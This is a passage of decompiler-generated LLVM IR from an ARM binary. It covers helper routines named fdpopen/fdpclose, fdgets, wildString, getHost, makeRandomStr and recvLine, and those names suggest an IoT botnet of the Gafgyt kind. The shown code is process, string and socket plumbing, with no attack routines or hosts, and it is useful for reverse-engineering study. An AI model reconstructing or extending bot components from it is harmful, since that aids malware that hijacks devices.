  br i1 %v7_8e4c, label %dec_label_pc_8e54, label %dec_label_pc_8e68

dec_label_pc_8e54:                                ; preds = %dec_label_pc_8e44, %entry
  %v1_8e58 = add i32 %tmp, 1
  %v1_8e5c = inttoptr i32 %v1_8e58 to i8*
  %v2_8e5c = load i8, i8* %v1_8e5c, align 1
  %v2_8e60 = icmp eq i8 %v2_8e5c, 0
  br i1 %v2_8e60, label %dec_label_pc_8e74, label %dec_label_pc_8e68

dec_label_pc_8e68:                                ; preds = %dec_label_pc_8e44, %dec_label_pc_8e54
  br label %dec_label_pc_9084

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8e54
  %v2_8e74 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8e7c = call i32 @__GI_pipe(i32 %v2_8e74)
  %v1_8e84 = icmp slt i32 %v1_8e7c, 0
  br i1 %v1_8e84, label %dec_label_pc_8e8c, label %dec_label_pc_8e98

dec_label_pc_8e8c:                                ; preds = %dec_label_pc_8e74
  br label %dec_label_pc_9084

dec_label_pc_8e98:                                ; preds = %dec_label_pc_8e74
  %v2_8e9c = load i32, i32* @global_var_26884.37, align 4
  %v2_8ea0 = icmp eq i32 %v2_8e9c, 0
  br i1 %v2_8ea0, label %dec_label_pc_8ea8, label %dec_label_pc_8f2c

dec_label_pc_8ea8:                                ; preds = %dec_label_pc_8e98
  %v0_8ea8 = call i32 @getdtablesize()
  %v5_8ebc = icmp sgt i32 %v0_8ea8, 0
  br i1 %v5_8ebc, label %dec_label_pc_8ecc, label %dec_label_pc_8ec0

dec_label_pc_8ec0:                                ; preds = %dec_label_pc_8ea8
  br label %dec_label_pc_9084

dec_label_pc_8ecc:                                ; preds = %dec_label_pc_8ea8
  %v3_8ed0 = mul i32 %v0_8ea8, 4
  %v1_8ed8 = call i32 @malloc(i32 %v3_8ed0)
  store i32 %v1_8ed8, i32* @global_var_26884.37, align 4
  %v2_8ef4 = icmp eq i32 %v1_8ed8, 0
  br i1 %v2_8ef4, label %dec_label_pc_8efc, label %dec_label_pc_8f08

dec_label_pc_8efc:                                ; preds = %dec_label_pc_8ecc
  br label %dec_label_pc_9084

dec_label_pc_8f08:                                ; preds = %dec_label_pc_8ecc
  store i32 %v3_8ed0, i32* @r2, align 4
  %v2_8f28 = inttoptr i32 %v1_8ed8 to i8*
  %v3_8f28 = call i32 @__GI_memset(i8* %v2_8f28, i32 0)
  br label %dec_label_pc_8f2c

dec_label_pc_8f2c:                                ; preds = %dec_label_pc_8e98, %dec_label_pc_8f08
  %v0_8f2c = call i32 @__vfork()
  %v7_8f44 = icmp eq i32 %v0_8f2c, -1
  br i1 %v7_8f44, label %dec_label_pc_8f5c, label %dec_label_pc_8f4c

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f2c
  %v2_8f50 = icmp eq i32 %v0_8f2c, 0
  %v2_8f84 = load i8, i8* %arg2, align 1
  %v7_8f88 = icmp eq i8 %v2_8f84, 114
  br i1 %v2_8f50, label %dec_label_pc_8f80, label %dec_label_pc_9020

dec_label_pc_8f5c:                                ; preds = %dec_label_pc_8f2c
  %v3_8f5c = load i32, i32* %stack_var_-32, align 4
  %v1_8f64 = call i32 @__libc_close(i32 %v3_8f5c)
  %v1_8f70 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_9084

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f4c
  br i1 %v7_8f88, label %dec_label_pc_8f90, label %dec_label_pc_8fc8

dec_label_pc_8f90:                                ; preds = %dec_label_pc_8f80
  %v7_8f94 = icmp eq i32 %tmp3, 1
  br i1 %v7_8f94, label %dec_label_pc_8fb8, label %dec_label_pc_8f9c

dec_label_pc_8f9c:                                ; preds = %dec_label_pc_8f90
  %v0_8fa8 = call i32 @dup2()
  %v1_8fb4 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_8fb8

dec_label_pc_8fb8:                                ; preds = %dec_label_pc_8f90, %dec_label_pc_8f9c
  %v3_8fb8 = load i32, i32* %stack_var_-32, align 4
  %v1_8fc0 = call i32 @__libc_close(i32 %v3_8fb8)
  br label %dec_label_pc_8ffc

dec_label_pc_8fc8:                                ; preds = %dec_label_pc_8f80
  %v3_8fc8 = load i32, i32* %stack_var_-32, align 4
  %v2_8fcc = icmp eq i32 %v3_8fc8, 0
  br i1 %v2_8fcc, label %dec_label_pc_8ff0, label %dec_label_pc_8fd4

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8fc8
  %v0_8fe0 = call i32 @dup2()
  %v3_8fe4 = load i32, i32* %stack_var_-32, align 4
  %v1_8fec = call i32 @__libc_close(i32 %v3_8fe4)
  br label %dec_label_pc_8ff0

dec_label_pc_8ff0:                                ; preds = %dec_label_pc_8fc8, %dec_label_pc_8fd4
  %v1_8ff8 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_8ffc

dec_label_pc_8ffc:                                ; preds = %dec_label_pc_8fb8, %dec_label_pc_8ff0
  store i32 ptrtoint ([8 x i8]* @global_var_1843c.39 to i32), i32* @r0, align 4
  %v8_9014 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1843c.39 to i32), i32 ptrtoint ([3 x i8]* @global_var_18444.41 to i32), i32 ptrtoint ([3 x i8]* @global_var_18448.43 to i32), i32 %arg1, i32 0)
  %v1_901c = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_9020:                                ; preds = %dec_label_pc_8f4c
  br i1 %v7_8f88, label %dec_label_pc_9030, label %dec_label_pc_9048

dec_label_pc_9030:                                ; preds = %dec_label_pc_9020
  %v3_9030 = load i32, i32* %stack_var_-32, align 4
  %v1_9040 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_905c

dec_label_pc_9048:                                ; preds = %dec_label_pc_9020
  %v3_9050 = load i32, i32* %stack_var_-32, align 4
  %v1_9058 = call i32 @__libc_close(i32 %v3_9050)
  br label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9030, %dec_label_pc_9048
  %stack_var_-40.0 = phi i32 [ %v3_9030, %dec_label_pc_9030 ], [ %tmp3, %dec_label_pc_9048 ]
  %v3_9060 = mul i32 %stack_var_-40.0, 4
  %v2_906c = load i32, i32* @global_var_26884.37, align 4
  %v2_9070 = add i32 %v2_906c, %v3_9060
  %v2_9078 = inttoptr i32 %v2_9070 to i32*
  store i32 %v0_8f2c, i32* %v2_9078, align 4
  br label %dec_label_pc_9084

dec_label_pc_9084:                                ; preds = %dec_label_pc_8f5c, %dec_label_pc_8efc, %dec_label_pc_8ec0, %dec_label_pc_8e8c, %dec_label_pc_8e68, %dec_label_pc_905c
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8e8c ], [ -1, %dec_label_pc_8efc ], [ -1, %dec_label_pc_8f5c ], [ %stack_var_-40.0, %dec_label_pc_905c ], [ -1, %dec_label_pc_8ec0 ], [ -1, %dec_label_pc_8e68 ]
  store i32 %v3_8e20, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8f2c, { 1, 2, 0 }
  uselistorder i32 %v3_8ed0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 5, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9084, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_905c, { 1, 0 }
  uselistorder label %dec_label_pc_8ffc, { 1, 0 }
  uselistorder label %dec_label_pc_8ff0, { 1, 0 }
  uselistorder label %dec_label_pc_8fb8, { 1, 0 }
  uselistorder label %dec_label_pc_8f2c, { 1, 0 }
  uselistorder label %dec_label_pc_8e68, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_90a4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_90a4, i32* @ip, align 4
  %v2_90bc = load i32, i32* @global_var_26884.37, align 4
  %v2_90c0 = icmp eq i32 %v2_90bc, 0
  br i1 %v2_90c0, label %dec_label_pc_9214, label %dec_label_pc_90c8

dec_label_pc_90c8:                                ; preds = %entry
  %v3_90cc = mul i32 %arg1, 4
  %v2_90dc = add i32 %v2_90bc, %v3_90cc
  %v1_90e0 = inttoptr i32 %v2_90dc to i32*
  %v2_90e0 = load i32, i32* %v1_90e0, align 4
  %v2_90e4 = icmp eq i32 %v2_90e0, 0
  br i1 %v2_90e4, label %dec_label_pc_9214, label %dec_label_pc_90f8

dec_label_pc_90f8:                                ; preds = %dec_label_pc_90c8
  %v1_90fc = call i32 @__libc_close(i32 %arg1)
  %v2_9100 = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_9100, i32* @r0, align 4
  %v1_9108 = call i32 @sigemptyset(i32 %v2_9100)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9118 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 2)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9128 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 3)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9138 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 1)
  %v2_9140 = ptrtoint i32* %stack_var_-148 to i32
  %v3_914c = bitcast i32* %stack_var_-276 to %_TYPEDEF_sigset_t*
  %v4_914c = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_914c, i32 %v2_9140)
  %v2_916c = ptrtoint i32* %stack_var_-280 to i32
  br label %dec_label_pc_9150

dec_label_pc_9150:                                ; preds = %dec_label_pc_9194, %dec_label_pc_90f8
  %v2_9160 = load i32, i32* @global_var_26884.37, align 4
  %v2_9164 = add i32 %v2_9160, %v3_90cc
  %v1_9168 = inttoptr i32 %v2_9164 to i32*
  %v2_9168 = load i32, i32* %v1_9168, align 4
  %v3_917c = call i32 @__libc_waitpid(i32 %v2_9168, i32 %v2_916c, i32 0)
  %v3_918c = icmp eq i32 %v3_917c, -1
  %v8_918c = icmp eq i32 %v3_917c, -1
  br i1 %v3_918c, label %dec_label_pc_9194, label %dec_label_pc_91a8

dec_label_pc_9194:                                ; preds = %dec_label_pc_9150
  %v0_9194 = call i32 @__errno_location()
  %v1_919c = inttoptr i32 %v0_9194 to i32*
  %v2_919c = load i32, i32* %v1_919c, align 4
  %v7_91a0 = icmp eq i32 %v2_919c, 4
  br i1 %v7_91a0, label %dec_label_pc_9150, label %dec_label_pc_91a8

dec_label_pc_91a8:                                ; preds = %dec_label_pc_9150, %dec_label_pc_9194
  %v3_91b8 = bitcast i32* %stack_var_-148 to %_TYPEDEF_sigset_t*
  %v4_91b8 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_91b8, i32 0)
  %v3_91c0 = mul i32 %tmp6, 4
  %v2_91cc = load i32, i32* @global_var_26884.37, align 4
  %v2_91d0 = add i32 %v2_91cc, %v3_91c0
  %v2_91d8 = inttoptr i32 %v2_91d0 to i32*
  store i32 0, i32* %v2_91d8, align 4
  br i1 %v8_918c, label %dec_label_pc_9214, label %dec_label_pc_91e8

dec_label_pc_91e8:                                ; preds = %dec_label_pc_91a8
  %v3_91e8 = load i32, i32* %stack_var_-280, align 4
  %v1_91f4 = and i32 %v3_91e8, 65280
  %v3_91f81 = udiv i32 %v1_91f4, 256
  br label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %dec_label_pc_91e8, %dec_label_pc_91a8, %entry, %dec_label_pc_90c8
  %storemerge4 = phi i32 [ -1, %dec_label_pc_90c8 ], [ -1, %entry ], [ %v3_91f81, %dec_label_pc_91e8 ], [ -1, %dec_label_pc_91a8 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v2_9100, { 1, 0, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_90cc, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_26884.37, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9214, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_91a8, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_9228 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_9228, i32* @ip, align 4
  br label %dec_label_pc_9298

dec_label_pc_9258:                                ; preds = %dec_label_pc_92a8
  store i32 %v2_92b4, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_9274 = call i32 @__libc_read(i32 %arg3)
  %v1_9284 = add nuw i32 %storemerge25, 1
  %v7_9290 = icmp eq i32 %v1_9274, 1
  br i1 %v7_9290, label %dec_label_pc_9298, label %dec_label_pc_92c8

dec_label_pc_9298:                                ; preds = %entry, %dec_label_pc_9258
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_9284, %dec_label_pc_9258 ]
  %v6_92a4 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_92a4, label %dec_label_pc_92a8, label %dec_label_pc_92c8

dec_label_pc_92a8:                                ; preds = %dec_label_pc_9298
  %v2_92b4 = add i32 %storemerge25, %arg1
  %v1_92b8 = add i32 %v2_92b4, -1
  %v1_92bc = inttoptr i32 %v1_92b8 to i8*
  %v2_92bc = load i8, i8* %v1_92bc, align 1
  %v7_92c0 = icmp eq i8 %v2_92bc, 10
  br i1 %v7_92c0, label %dec_label_pc_92c8, label %dec_label_pc_9258

dec_label_pc_92c8:                                ; preds = %dec_label_pc_92a8, %dec_label_pc_9298, %dec_label_pc_9258
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_92a8 ], [ 1, %dec_label_pc_9298 ], [ %v1_9274, %dec_label_pc_9258 ]
  %v2_92cc = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_92cc, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v2_92b4, { 1, 0 }
  uselistorder i32 %v1_9274, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9298, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_934c4 = load i8, i8* %arg1, align 1
  %v2_93506 = icmp eq i8 %v2_934c4, 0
  br i1 %v2_93506, label %dec_label_pc_9364, label %dec_label_pc_9358

dec_label_pc_9318:                                ; preds = %dec_label_pc_9358
  %v3_931c = mul i32 %stack_var_-20.07, 16
  %v4_9320 = ptrtoint i8* %v3_933c to i32
  %v2_9324 = load i8, i8* %v3_933c, align 1
  %v3_9324 = zext i8 %v2_9324 to i32
  %v4_9330 = mul nuw nsw i32 %v3_9324, 4
  %v5_9330 = add i32 %v4_9330, ptrtoint (i32* @global_var_1844c.46 to i32)
  %v6_9330 = inttoptr i32 %v5_9330 to i32*
  %v7_9330 = load i32, i32* %v6_9330, align 4
  %v2_9334 = or i32 %v7_9330, %v3_931c
  %v1_9340 = add i32 %v4_9320, 1
  %v5_9344 = inttoptr i32 %v1_9340 to i8*
  %v2_934c = load i8, i8* %v5_9344, align 1
  %v2_9350 = icmp eq i8 %v2_934c, 0
  br i1 %v2_9350, label %dec_label_pc_9364, label %dec_label_pc_9358

dec_label_pc_9358:                                ; preds = %entry, %dec_label_pc_9318
  %v3_933c = phi i8* [ %v5_9344, %dec_label_pc_9318 ], [ %arg1, %entry ]
  %stack_var_-20.07 = phi i32 [ %v2_9334, %dec_label_pc_9318 ], [ 0, %entry ]
  %v1_935c = icmp slt i32 %stack_var_-20.07, 0
  br i1 %v1_935c, label %dec_label_pc_9364, label %dec_label_pc_9318

dec_label_pc_9364:                                ; preds = %dec_label_pc_9318, %dec_label_pc_9358, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_9334, %dec_label_pc_9318 ], [ %stack_var_-20.07, %dec_label_pc_9358 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9364, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9358, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_937c = load i32, i32* @r4, align 4
  %v6_937c = load i32, i32* @fp, align 4
  store i32 37764, i32* %stack_var_-4, align 4
  %v2_9380 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9380, i32* @fp, align 4
  %v2_9394 = load i8, i8* %arg1, align 1
  %v7_93a0 = icmp eq i8 %v2_9394, 42
  br i1 %v7_93a0, label %dec_label_pc_93d4, label %dec_label_pc_93a8

dec_label_pc_93a8:                                ; preds = %entry
  %v7_93ac = icmp eq i8 %v2_9394, 63
  br i1 %v7_93ac, label %dec_label_pc_9444, label %dec_label_pc_93b4

dec_label_pc_93b4:                                ; preds = %dec_label_pc_93a8
  %v2_93b8 = icmp eq i8 %v2_9394, 0
  br i1 %v2_93b8, label %dec_label_pc_93c4, label %dec_label_pc_949c

dec_label_pc_93c4:                                ; preds = %dec_label_pc_93b4
  %v2_93c8 = load i8, i8* %tmp, align 1
  %v3_93c8 = zext i8 %v2_93c8 to i32
  br label %dec_label_pc_9510

dec_label_pc_93d4:                                ; preds = %entry
  %v1_93d8 = add i32 %tmp9, 1
  %v3_93e4 = inttoptr i32 %v1_93d8 to i8*
  %v4_93e4 = call i32 @wildString(i8* %v3_93e4, i32 %arg2)
  %v2_93ec = icmp eq i32 %v4_93e4, 0
  br i1 %v2_93ec, label %dec_label_pc_9430, label %dec_label_pc_93f4

dec_label_pc_93f4:                                ; preds = %dec_label_pc_93d4
  %v2_93f8 = load i8, i8* %tmp, align 1
  %v2_93fc = icmp eq i8 %v2_93f8, 0
  br i1 %v2_93fc, label %dec_label_pc_9438, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %dec_label_pc_93f4
  %v1_9408 = add i32 %arg2, 1
  %v4_9414 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9408)
  %v2_941c = icmp eq i32 %v4_9414, 0
  br i1 %v2_941c, label %dec_label_pc_9430, label %dec_label_pc_9438

dec_label_pc_9430:                                ; preds = %dec_label_pc_9404, %dec_label_pc_93d4
  br label %dec_label_pc_9438

dec_label_pc_9438:                                ; preds = %dec_label_pc_93f4, %dec_label_pc_9404, %dec_label_pc_9430
  %storemerge4 = phi i32 [ 0, %dec_label_pc_9430 ], [ 1, %dec_label_pc_9404 ], [ 1, %dec_label_pc_93f4 ]
  br label %dec_label_pc_9510

dec_label_pc_9444:                                ; preds = %dec_label_pc_93a8
  %v2_9448 = load i8, i8* %tmp, align 1
  %v2_944c = icmp eq i8 %v2_9448, 0
  br i1 %v2_944c, label %dec_label_pc_9490, label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %dec_label_pc_9444
  %v1_9458 = add i32 %tmp9, 1
  %v1_9460 = add i32 %arg2, 1
  %v2_946c = inttoptr i32 %v1_9458 to i8*
  %v3_946c = call i32 @wildString(i8* %v2_946c, i32 %v1_9460)
  %v2_9474 = icmp ne i32 %v3_946c, 0
  %. = zext i1 %v2_9474 to i32
  br label %dec_label_pc_9490

dec_label_pc_9490:                                ; preds = %dec_label_pc_9454, %dec_label_pc_9444
  %storemerge3 = phi i32 [ 1, %dec_label_pc_9444 ], [ %., %dec_label_pc_9454 ]
  br label %dec_label_pc_9510

dec_label_pc_949c:                                ; preds = %dec_label_pc_93b4
  %v2_94a0 = load i8, i8* %arg1, align 1
  %v3_94a0 = zext i8 %v2_94a0 to i32
  %v1_94a8 = call i32 @__GI_toupper(i32 %v3_94a0)
  store i32 %v1_94a8, i32* @r4, align 4
  %v2_94b4 = load i8, i8* %tmp, align 1
  %v3_94b4 = zext i8 %v2_94b4 to i32
  %v1_94bc = call i32 @__GI_toupper(i32 %v3_94b4)
  %v0_94c4 = load i32, i32* @r4, align 4
  %v9_94c4 = icmp eq i32 %v0_94c4, %v1_94bc
  br i1 %v9_94c4, label %dec_label_pc_94cc, label %dec_label_pc_9508

dec_label_pc_94cc:                                ; preds = %dec_label_pc_949c
  %v1_94d0 = add i32 %tmp9, 1
  %v1_94d8 = add i32 %arg2, 1
  %v2_94e4 = inttoptr i32 %v1_94d0 to i8*
  %v3_94e4 = call i32 @wildString(i8* %v2_94e4, i32 %v1_94d8)
  %v2_94ec = icmp ne i32 %v3_94e4, 0
  %.8 = zext i1 %v2_94ec to i32
  br label %dec_label_pc_9508

dec_label_pc_9508:                                ; preds = %dec_label_pc_94cc, %dec_label_pc_949c
  %storemerge = phi i32 [ 1, %dec_label_pc_949c ], [ %.8, %dec_label_pc_94cc ]
  br label %dec_label_pc_9510

dec_label_pc_9510:                                ; preds = %dec_label_pc_9490, %dec_label_pc_9438, %dec_label_pc_93c4, %dec_label_pc_9508
  %stack_var_-44.0 = phi i32 [ %storemerge4, %dec_label_pc_9438 ], [ %storemerge3, %dec_label_pc_9490 ], [ %v3_93c8, %dec_label_pc_93c4 ], [ %storemerge, %dec_label_pc_9508 ]
  store i32 %v3_937c, i32* @r4, align 4
  store i32 %v6_937c, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_9510, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9438, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_9540 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_9540, i32* %arg2, align 4
  %v3_9558 = icmp eq i32 %v1_9540, -1
  %. = zext i1 %v3_9558 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i8*, align 4
  %v0_9594 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_9594 to i8*
  store i8* %storemerge2, i8** %stack_var_-20, align 4
  %v2_95cc3 = load i8, i8* %storemerge2, align 1
  %v2_95d05 = icmp eq i8 %v2_95cc3, 0
  br i1 %v2_95d05, label %dec_label_pc_95d8, label %dec_label_pc_959c

dec_label_pc_959c:                                ; preds = %entry, %dec_label_pc_959c
  %v2_95d88 = phi i8* [ %storemerge, %dec_label_pc_959c ], [ %storemerge2, %entry ]
  %v2_95a0 = load i8, i8* %v2_95d88, align 1
  %v3_95a0 = zext i8 %v2_95a0 to i32
  store i32 %v3_95a0, i32* %r0.global-to-local, align 4
  %v1_95a8 = call i32 @__GI_toupper(i32 %v3_95a0)
  store i32 %v1_95a8, i32* %r0.global-to-local, align 4
  %v3_95b4 = load i8*, i8** %stack_var_-20, align 4
  %v1_95b8 = trunc i32 %v1_95a8 to i8
  store i8 %v1_95b8, i8* %v3_95b4, align 1
  %v4_95bc = ptrtoint i8* %v3_95b4 to i32
  %v1_95c0 = add i32 %v4_95bc, 1
  %storemerge = inttoptr i32 %v1_95c0 to i8*
  store i8* %storemerge, i8** %stack_var_-20, align 4
  %v2_95cc = load i8, i8* %storemerge, align 1
  %v2_95d0 = icmp eq i8 %v2_95cc, 0
  br i1 %v2_95d0, label %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge, label %dec_label_pc_959c

dec_label_pc_95c8.dec_label_pc_95d8_crit_edge:    ; preds = %dec_label_pc_959c
  %v13_95d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_95d8

dec_label_pc_95d8:                                ; preds = %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge, %entry
  %v13_95d8 = phi i32 [ %v13_95d8.pre, %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge ], [ %v0_9594, %entry ]
  ret i32 %v13_95d8

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 2, 0 }
  uselistorder i8** %stack_var_-20, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_959c, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_95e0 = load i32, i32* @r4, align 4
  %v6_95e0 = load i32, i32* @fp, align 4
  %v0_95ec = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  %v5_965817 = icmp sgt i32 %arg2, 0
  br i1 %v5_965817, label %dec_label_pc_9608, label %dec_label_pc_965c

dec_label_pc_9608:                                ; preds = %entry, %dec_label_pc_9608
  %storemerge118 = phi i32 [ %v1_9644, %dec_label_pc_9608 ], [ 0, %entry ]
  %v2_9614 = add i32 %storemerge118, %v0_95ec
  store i32 %v2_9614, i32* @r4, align 4
  %v0_9618 = call i32 @rand_cmwc()
  %v2_9628 = urem i32 %v0_9618, 26
  store i32 %v2_9628, i32* %r0.global-to-local, align 4
  %v1_9634 = add nuw nsw i32 %v2_9628, 65
  %v1_963c = trunc i32 %v1_9634 to i8
  %v2_963c = load i32, i32* @r4, align 4
  %v3_963c = inttoptr i32 %v2_963c to i8*
  store i8 %v1_963c, i8* %v3_963c, align 1
  %v1_9644 = add i32 %storemerge118, 1
  %v3_9650.pre = load i32, i32* %stack_var_-32, align 4
  %v5_9658 = icmp slt i32 %v1_9644, %v3_9650.pre
  br i1 %v5_9658, label %dec_label_pc_9608, label %dec_label_pc_964c.dec_label_pc_965c_crit_edge

dec_label_pc_964c.dec_label_pc_965c_crit_edge:    ; preds = %dec_label_pc_9608
  %v12_9660.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_965c

dec_label_pc_965c:                                ; preds = %dec_label_pc_964c.dec_label_pc_965c_crit_edge, %entry
  %v12_9660 = phi i32 [ %v12_9660.pre, %dec_label_pc_964c.dec_label_pc_965c_crit_edge ], [ %v0_95ec, %entry ]
  store i32 %v3_95e0, i32* @r4, align 4
  store i32 %v6_95e0, i32* @fp, align 4
  ret i32 %v12_9660

; uselistorder directives
  uselistorder i32 %v1_9644, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_9608, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_96b8.lr.ph:
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9668 = load i32, i32* @fp, align 4
  store i32 %v3_9668, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_9690 = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_96a4 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_96b8

dec_label_pc_96b8:                                ; preds = %dec_label_pc_96b8.lr.ph, %dec_label_pc_96b8
  %storemerge527 = phi i32 [ 0, %dec_label_pc_96b8.lr.ph ], [ %v1_96cc, %dec_label_pc_96b8 ]
  %v5_96c4 = mul nuw nsw i32 %storemerge527, 4
  %v6_96c4 = add i32 %v5_96c4, %v2_96a4
  %v7_96c4 = inttoptr i32 %v6_96c4 to i32*
  store i32 0, i32* %v7_96c4, align 4
  %v1_96cc = add nuw nsw i32 %storemerge527, 1
  %tmp52 = icmp ult i32 %v1_96cc, 32
  br i1 %tmp52, label %dec_label_pc_96b8, label %dec_label_pc_96e0

dec_label_pc_96e0:                                ; preds = %dec_label_pc_96b8
  %v13_9668 = ptrtoint i32* %stack_var_-16 to i32
  %v3_96e4 = udiv i32 %arg1, 32
  %v3_96f0 = mul nuw nsw i32 %v3_96e4, 4
  %v2_96f8 = add nsw i32 %v3_96f0, -160
  %v2_96fc = add i32 %v2_96f8, %v13_9668
  %v1_9700 = inttoptr i32 %v2_96fc to i32*
  %v2_9700 = load i32, i32* %v1_9700, align 4
  %v1_9708 = urem i32 %arg1, 32
  %v6_9710 = shl i32 1, %v1_9708
  %v2_9714 = or i32 %v2_9700, %v6_9710
  store i32 %v2_9714, i32* %v1_9700, align 4
  %v1_9734 = add i32 %arg1, 1
  %v2_9740 = ptrtoint i32* %stack_var_-184 to i32
  %v5_9754 = call i32 @__libc_select(i32 %v1_9734, i32 %v2_96a4, i32 0, i32 %v2_96a4, i32 %v2_9740)
  %v5_9768 = icmp sgt i32 %v5_9754, 0
  br i1 %v5_9768, label %dec_label_pc_98e8.preheader, label %dec_label_pc_9854.preheader

dec_label_pc_9854.preheader:                      ; preds = %dec_label_pc_96e0
  %v7_985c23 = icmp slt i32 %tmp33, 10
